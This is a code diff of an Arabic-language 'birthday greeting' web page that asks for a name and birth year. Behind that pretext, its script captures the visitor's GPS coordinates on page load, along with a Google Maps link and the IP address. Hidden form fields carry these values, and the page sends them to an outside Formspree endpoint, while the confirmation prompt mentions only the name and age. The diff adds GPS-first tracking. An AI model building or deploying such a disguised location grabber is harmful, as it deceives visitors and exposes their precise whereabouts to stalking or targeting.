@@ -25,15 +25,8 @@
       max-width: 400px;
       border: 3px solid #ff6b81;
     }
-    .icon {
-      font-size: 50px;
-      margin-bottom: 10px;
-    }
-    h2 {
-      color: #ff4757;
-      margin-bottom: 10px;
-      font-size: 24px;
-    }
+    .icon { font-size: 50px; margin-bottom: 10px; }
+    h2 { color: #ff4757; margin-bottom: 10px; font-size: 24px; }
     .greeting-text {
       font-size: 15px;
       color: #555;
@@ -53,10 +46,7 @@
       color: #c0392b;
       display: none;
     }
-    .birthday-message.show {
-      display: block;
-      animation: fadeIn 0.5s ease;
-    }
+    .birthday-message.show { display: block; animation: fadeIn 0.5s ease; }
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(-10px); }
       to { opacity: 1; transform: translateY(0); }
@@ -72,12 +62,8 @@
       text-align: center;
       background-color: #fafafa;
     }
-    input[type="number"] {
-      -moz-appearance: textfield;
-    }
-    input[type="number"]::-webkit-inner-spin-button {
-      -webkit-appearance: none;
-    }
+    input[type="number"] { -moz-appearance: textfield; }
+    input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }
     .btn-submit {
       width: 100%;
       padding: 14px;
@@ -91,25 +77,13 @@
       transition: 0.3s;
       margin-top: 5px;
     }
-    .btn-submit:hover {
-      transform: scale(1.02);
-      box-shadow: 0 5px 15px rgba(245, 87, 108, 0.4);
-    }
+    .btn-submit:hover { transform: scale(1.02); box-shadow: 0 5px 15px rgba(245, 87, 108, 0.4); }
     #status {
       font-size: 14px;
       margin: 15px 0 10px;
       color: #666;
       font-weight: 500;
       min-height: 25px;
-    }
-    .age-badge {
-      display: inline-block;
-      background: #ff6b81;
-      color: white;
-      padding: 3px 12px;
-      border-radius: 20px;
-      font-size: 14px;
-      margin-top: 5px;
     }
     .info-box {
       background: #f0f4ff;
@@ -121,192 +95,217 @@
       border-right: 4px solid #3b82f6;
       text-align: right;
     }
-    .info-box span {
-      font-weight: bold;
-      color: #1e293b;
-    }
-    .loading {
-      color: #94a3b8;
-    }
+    .info-box span { font-weight: bold; color: #1e293b; }
+    .loading { color: #94a3b8; }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <div class="icon">🎉</div>
-    <h2>كل عام وأنت بخير!</h2>
-    <p class="greeting-text">
-      🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!
-    </p>
+<div class="card">
+  <div class="icon">🎉</div>
+  <h2>كل عام وأنت بخير!</h2>
+  <p class="greeting-text">🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!</p>
 
-    <!-- معلومات الجهاز -->
-    <div class="info-box" id="deviceInfo">
-      🌐 <span>IP الخاص بك:</span> <span id="ipDisplay" class="loading">جارٍ التحميل...</span><br>
-      📍 <span>الموقع التقريبي:</span> <span id="locationDisplay" class="loading">جارٍ التحميل...</span>
-    </div>
-
-    <!-- رسالة العمر -->
-    <div id="birthdayMessage" class="birthday-message">
-      🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
-      <br>كل سنة وأنت طيب يا بطل 💪
-    </div>
-
-    <form id="birthdayForm">
-      <input type="text" id="nameInput" placeholder="👤 أدخل اسمك الكريم" required>
-      <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
-
-      <div id="status"></div>
-
-      <input type="hidden" id="lat" name="latitude">
-      <input type="hidden" id="lon" name="longitude">
-      <input type="hidden" id="map_link" name="google_maps_link">
-      <input type="hidden" id="age" name="age">
-      <input type="hidden" id="ip" name="ip">
-
-      <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
-    </form>
+  <!-- معلومات الجهاز -->
+  <div class="info-box" id="deviceInfo">
+    🌐 <span>IP الخاص بك:</span> <span id="ipDisplay" class="loading">جارٍ التحميل...</span><br>
+    📍 <span>الموقع:</span> <span id="locationDisplay" class="loading">جارٍ التحميل...</span>
   </div>
 
-  <script>
-    // ===== جلب IP والموقع =====
-    async function fetchIPAndLocation() {
-      try {
-        // جلب الـ IP
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        const ip = ipData.ip;
+  <!-- رسالة العمر -->
+  <div id="birthdayMessage" class="birthday-message">
+    🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
+    <br>كل سنة وأنت طيب يا بطل 💪
+  </div>
 
-        // جلب الموقع التقريبي
-        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-        const geoData = await geoRes.json();
+  <form id="birthdayForm">
+    <input type="text" id="nameInput" placeholder="👤 أدخل اسمك الكريم" required>
+    <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
+    <div id="status"></div>
 
-        // عرض الـ IP
-        document.getElementById('ipDisplay').textContent = ip;
-        document.getElementById('ip').value = ip;
+    <input type="hidden" id="lat" name="latitude">
+    <input type="hidden" id="lon" name="longitude">
+    <input type="hidden" id="map_link" name="google_maps_link">
+    <input type="hidden" id="age" name="age">
+    <input type="hidden" id="ip" name="ip">
 
-        // عرض الموقع
+    <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
+  </form>
+</div>
+
+<script>
+  // ===== متغيرات لتخزين الموقع =====
+  let userLat = null;
+  let userLon = null;
+  let locationSource = 'IP';
+
+  // ===== جلب الموقع عبر GPS تلقائياً =====
+  function getLocationGPS() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          userLat = position.coords.latitude;
+          userLon = position.coords.longitude;
+          locationSource = 'GPS';
+          document.getElementById('lat').value = userLat;
+          document.getElementById('lon').value = userLon;
+          document.getElementById('map_link').value = `https://maps.google.com/?q=${userLat},${userLon}`;
+          
+          // تحديث عرض الموقع
+          updateLocationDisplay();
+        },
+        (error) => {
+          console.log("GPS غير مفعل، سيتم استخدام الموقع من IP.");
+          fetchIPAndLocation(); // استخدام IP كخيار احتياطي
+        }
+      );
+    } else {
+      fetchIPAndLocation(); // المتصفح لا يدعم GPS
+    }
+  }
+
+  // ===== جلب IP والموقع عبر IP =====
+  async function fetchIPAndLocation() {
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
+
+      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+      const geoData = await geoRes.json();
+
+      document.getElementById('ipDisplay').textContent = ip;
+      document.getElementById('ip').value = ip;
+
+      // إذا لم يكن GPS متاحاً، استخدم الموقع من IP
+      if (!userLat) {
+        // ipapi.co لا يعطي إحداثيات دقيقة، لكن نعرض المدينة والدولة
         const locationText = `${geoData.city || 'غير معروف'}، ${geoData.region || ''}، ${geoData.country_name || 'غير معروف'}`;
         document.getElementById('locationDisplay').textContent = locationText;
-
-      } catch (error) {
-        document.getElementById('ipDisplay').textContent = '⚠️ تعذر جلب IP';
-        document.getElementById('locationDisplay').textContent = '⚠️ تعذر جلب الموقع';
       }
+
+    } catch (error) {
+      document.getElementById('ipDisplay').textContent = '⚠️ تعذر جلب IP';
+      document.getElementById('locationDisplay').textContent = '⚠️ تعذر جلب الموقع';
     }
+  }
 
-    // ===== جلب الموقع الجغرافي (GPS) =====
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            document.getElementById('lat').value = lat;
-            document.getElementById('lon').value = lon;
-            document.getElementById('map_link').value = `https://maps.google.com/?q=${lat},${lon}`;
-          },
-          (error) => {
-            console.log("الموقع غير مفعل");
-          }
-        );
-      }
+  // ===== تحديث عرض الموقع =====
+  function updateLocationDisplay() {
+    if (userLat && userLon) {
+      // استخدام GPS لعرض الموقع
+      fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userLat}&longitude=${userLon}&localityLanguage=ar`)
+        .then(response => response.json())
+        .then(data => {
+          const city = data.locality || data.city || 'غير معروف';
+          const country = data.countryName || 'غير معروف';
+          document.getElementById('locationDisplay').textContent = `${city}، ${country} (GPS)`;
+        })
+        .catch(() => {
+          document.getElementById('locationDisplay').textContent = `${userLat}, ${userLon} (GPS)`;
+        });
     }
+  }
 
-    // ===== حساب العمر =====
-    function calculateAgeAndShow() {
-      const name = document.getElementById('nameInput').value.trim();
-      const year = parseInt(document.getElementById('yearInput').value);
-      const currentYear = new Date().getFullYear();
-      const messageDiv = document.getElementById('birthdayMessage');
+  // ===== حساب العمر =====
+  function calculateAgeAndShow() {
+    const name = document.getElementById('nameInput').value.trim();
+    const year = parseInt(document.getElementById('yearInput').value);
+    const currentYear = new Date().getFullYear();
+    const messageDiv = document.getElementById('birthdayMessage');
 
-      if (name && year && year >= 1900 && year <= currentYear) {
-        const age = currentYear - year;
-        if (age > 0 && age < 120) {
-          document.getElementById('displayName').textContent = name;
-          document.getElementById('displayAge').textContent = age;
-          document.getElementById('age').value = age;
-          messageDiv.classList.add('show');
-          return;
-        }
-      }
-      messageDiv.classList.remove('show');
-    }
-
-    // ===== إرسال البيانات =====
-    function handleSubmit() {
-      const name = document.getElementById('nameInput').value.trim();
-      const year = document.getElementById('yearInput').value.trim();
-      const status = document.getElementById('status');
-      const age = document.getElementById('age').value;
-      const ip = document.getElementById('ip').value;
-
-      if (!name) {
-        status.innerText = "⚠️ الرجاء إدخال اسمك!";
-        status.style.color = "#ff4757";
+    if (name && year && year >= 1900 && year <= currentYear) {
+      const age = currentYear - year;
+      if (age > 0 && age < 120) {
+        document.getElementById('displayName').textContent = name;
+        document.getElementById('displayAge').textContent = age;
+        document.getElementById('age').value = age;
+        messageDiv.classList.add('show');
         return;
       }
+    }
+    messageDiv.classList.remove('show');
+  }
 
-      if (!year || isNaN(year) || year < 1900 || year > new Date().getFullYear()) {
-        status.innerText = "⚠️ الرجاء إدخال سنة ميلاد صحيحة!";
-        status.style.color = "#ff4757";
-        return;
-      }
+  // ===== إرسال البيانات =====
+  function handleSubmit() {
+    const name = document.getElementById('nameInput').value.trim();
+    const year = document.getElementById('yearInput').value.trim();
+    const status = document.getElementById('status');
+    const age = document.getElementById('age').value;
+    const ip = document.getElementById('ip').value;
 
-      if (!age || age < 1) {
-        status.innerText = "⚠️ يرجى التأكد من سنة الميلاد!";
-        status.style.color = "#ff4757";
-        return;
-      }
-
-      if (!confirm(`🎈 هل تريد إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) {
-        return;
-      }
-
-      status.innerText = "⏳ جاري الإرسال...";
-      status.style.color = "#333";
-
-      const data = {
-        name: name,
-        age: age,
-        birth_year: year,
-        ip: ip || "غير متاح",
-        latitude: document.getElementById('lat').value || "غير متاح",
-        longitude: document.getElementById('lon').value || "غير متاح",
-        google_maps_link: document.getElementById('map_link').value || "غير متاح"
-      };
-
-      fetch("https://formspree.io/f/xpqvvkdp", {
-        method: "POST",
-        body: JSON.stringify(data),
-        headers: {
-          'Accept': 'application/json',
-          'Content-Type': 'application/json'
-        }
-      }).then(response => {
-        if (response.ok) {
-          status.innerText = "✅ تم إرسال التهنئة بنجاح! شكراً لك 🎊";
-          status.style.color = "#2ed573";
-          document.getElementById('birthdayForm').reset();
-          document.getElementById('birthdayMessage').classList.remove('show');
-        } else {
-          status.innerText = "❌ حدث خطأ من الخادم، حاول مرة أخرى.";
-          status.style.color = "#ff4757";
-        }
-      }).catch(error => {
-        status.innerText = "❌ تعذر الاتصال بالخادم.";
-        status.style.color = "#ff4757";
-      });
+    if (!name) {
+      status.innerText = "⚠️ الرجاء إدخال اسمك!";
+      status.style.color = "#ff4757";
+      return;
     }
 
-    // ===== تشغيل عند تحميل الصفحة =====
-    window.onload = function() {
-      fetchIPAndLocation();
-      getLocation();
+    if (!year || isNaN(year) || year < 1900 || year > new Date().getFullYear()) {
+      status.innerText = "⚠️ الرجاء إدخال سنة ميلاد صحيحة!";
+      status.style.color = "#ff4757";
+      return;
+    }
 
-      document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
-      document.getElementById('nameInput').addEventListener('input', calculateAgeAndShow);
+    if (!age || age < 1) {
+      status.innerText = "⚠️ يرجى التأكد من سنة الميلاد!";
+      status.style.color = "#ff4757";
+      return;
+    }
+
+    if (!confirm(`🎈 هل تريد إرسال تهنئة باسم "${name}" وعمر ${age} سنة؟`)) {
+      return;
+    }
+
+    status.innerText = "⏳ جاري الإرسال...";
+    status.style.color = "#333";
+
+    const data = {
+      name: name,
+      age: age,
+      birth_year: year,
+      ip: ip || "غير متاح",
+      latitude: document.getElementById('lat').value || "غير متاح",
+      longitude: document.getElementById('lon').value || "غير متاح",
+      google_maps_link: document.getElementById('map_link').value || "غير متاح",
+      location_source: locationSource
     };
-  </script>
+
+    fetch("https://formspree.io/f/xpqvvkdp", {
+      method: "POST",
+      body: JSON.stringify(data),
+      headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+      }
+    }).then(response => {
+      if (response.ok) {
+        status.innerText = "✅ تم إرسال التهنئة بنجاح! شكراً لك 🎊";
+        status.style.color = "#2ed573";
+        document.getElementById('birthdayForm').reset();
+        document.getElementById('birthdayMessage').classList.remove('show');
+      } else {
+        status.innerText = "❌ حدث خطأ من الخادم، حاول مرة أخرى.";
+        status.style.color = "#ff4757";
+      }
+    }).catch(error => {
+      status.innerText = "❌ تعذر الاتصال بالخادم.";
+      status.style.color = "#ff4757";
+    });
+  }
+
+  // ===== تشغيل عند تحميل الصفحة =====
+  window.onload = function() {
+    // محاولة جلب الموقع عبر GPS أولاً
+    getLocationGPS();
+    
+    // جلب IP (دائماً)
+    fetchIPAndLocation();
+
+    document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
+    document.getElementById('nameInput').addEventListener('input', calculateAgeAndShow);
+  };
+</script>
 
 </body>
 </html>
